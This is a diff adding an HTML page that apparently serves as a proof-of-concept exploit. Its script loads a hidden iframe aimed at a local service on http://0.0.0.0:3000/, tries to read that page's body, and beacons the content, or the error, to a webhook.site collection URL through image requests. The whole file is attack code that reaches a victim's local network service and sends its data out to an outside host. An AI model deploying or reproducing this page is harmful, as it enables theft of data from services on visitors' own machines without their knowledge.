@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+new Image().src = 'https://webhook.site/showontest?step=1';
+
+var f = document.createElement('iframe');
+f.id = 'f1';
+
+f.onload = function(){
+  new Image().src = 'https://webhook.site/showontest?step=2_loaded';
+  try {
+    var c = f.contentDocument.body.innerHTML;
+    new Image().src = 'https://webhook.site/showontest?content=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+};
+
+f.src = 'http://0.0.0.0:3000/';
+document.body.appendChild(f);
+</script>
+</body>
+</html>
